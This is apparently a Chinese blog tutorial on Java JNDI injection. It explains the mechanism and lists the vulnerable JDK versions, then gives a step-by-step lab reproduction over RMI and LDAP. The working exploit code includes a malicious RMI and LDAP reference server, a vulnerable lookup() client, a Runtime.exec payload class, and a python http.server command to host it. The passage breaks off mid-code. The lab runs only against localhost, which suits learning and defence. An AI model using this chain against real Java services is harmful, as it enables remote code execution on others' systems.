## 一、前言
本篇文章作为 JNDI 注入学习的第一篇，主要了解其基本的原理及其利用，方便后续针对 JNDI 注入的学习，篇幅不长。
## 二、JNDI 简介
JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI
提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得
Java 应用程序可以和这些命名服务和目录服务之间进行交互。
上面较官方说法，通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的 `命令服务`和`目录服务`,如下图。
本篇文章主要探究 LADP、RMI、DNS 协议。
协议 | 作用  
---|---  
LDAP | 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容  
RMI | JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象  
DNS | 域名服务  
CORBA | 公共对象请求代理体系结构  
## 三、JNDI注入
JNDI 注入，即当开发者在定义 `JNDI` 接口初始化时，`lookup()` 方法的参数可控，攻击者就可以将恶意的 `url`
传入参数远程加载恶意载荷，造成注入攻击。
**代码示例：**
代码中定义了 `uri` 变量，`uri` 变量可控，并定义了一个 `rmi` 协议服务， `rmi://127.0.0.1:1099/Exploit`
为攻击者控制的链接，最后使用 `lookup()` 函数进行远程获取 `Exploit` 类（Exploit 类名为攻击者定义，不唯一），并执行它
    package com.rmi.demo;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    public class jndi {
        public static void main(String[] args) throws NamingException {
            String uri = "rmi://127.0.0.1:1099/Exploit";    // 指定查找的 uri 变量
            InitialContext initialContext = new InitialContext();// 得到初始目录环境的一个引用
            initialContext.lookup(uri); // 获取指定的远程对象
        }
    }
具体攻击流程图  
JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：
协议 | JDK6 | JDK7 | JDK8 | JDK11  
---|---|---|---|---  
LADP | 6u211以下 | 7u201以下 | 8u191以下 | 11.0.1以下  
RMI | 6u132以下 | 7u122以下 | 8u113以下 | 无  
## 四、JNDI 注入复现
### JNDI+RMI
#### 环境搭建
使用 IDEA 进行复现，这边使用的 JDK 版本为 Linux 版本的 [JDK
7u79](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox) ， [Windows
版本下载](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#license-lightbox)
1、首先 IDEA 新建一个项目
File-》New-》Project-》Maven-》Project SDK（选择 JDK 版本）-》Next-》填写项目名称-》Finish  
2、在 `/src/java` 目录下创建一个包，包名自定义，我这边为 `jndi_rmi_injection`  
3、在创建的包下新建 `rmi` 服务端和客户端  
服务端（RMIService.java）代码
    package jndi_rmi_injection;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import javax.naming.Reference;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    public class RMIServer {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.createRegistry(7778);
            Reference reference = new Reference("Calculator","Calculator","http://127.0.0.1:8081/");
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("RCE",wrapper);
        }
    }
客户端（RMIClient.java）代码，客户端也是受害端
    package jndi_rmi_injection;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    public class RMIClient {
        public static void main(String[] args) throws NamingException{
            String uri = "rmi://127.0.0.1:7778/RCE";
            InitialContext initialContext = new InitialContext();
            initialContext.lookup(uri);
        }
    }
HTTP 端恶意载荷（Calculator.java）代码
笔者使用的是 ubuntu 的环境，执行弹出计算器的命令为 `gnome-calculator`,若为Windwos 修改为 `calc` 即可
    public class Calculator {
        public Calculator() throws Exception {
            Runtime.getRuntime().exec("gnome-calculator");
        }
    }
#### 启动服务
1、将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件
    javac Calculator.java
2、在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 RMIServer.java
的 Reference 里面的链接端口一致  
python3 -m http.server 8081  
3、IDEA 将漏洞环境启动起来并实现攻击，顺序为先运行服务端，再起客户端  
服务端  
再点击运行客户端，远程获取恶意类，并执行恶意类代码，实现弹窗  
### JNDI+LDAP
#### 环境搭建
环境使用上面的即可，但要先本地导入依赖，`maven` 无法拉取 `unboundid` 这个依赖，这一步卡了一段时间，坑点之一
1、点击下载 [unboundid-ldapsdk-3.2.0.jar](https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar)，导入依赖即可，本环境在跟目录下创建了 `/lib`
目录用于放置本地依赖  
2、LDAPServer.java 服务端代码
    package jndi_ldap_injection;
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    public class LDAPServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main (String[] args) {
            String url = "http://127.0.0.1:8081/#Calculator";
            int port = 1234;
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen",
                        InetAddress.getByName("0.0.0.0"),
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port);
                ds.startListening();
            }
            catch ( Exception e ) {
                e.printStackTrace();
            }
        }
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
            private URL codebase;
            /**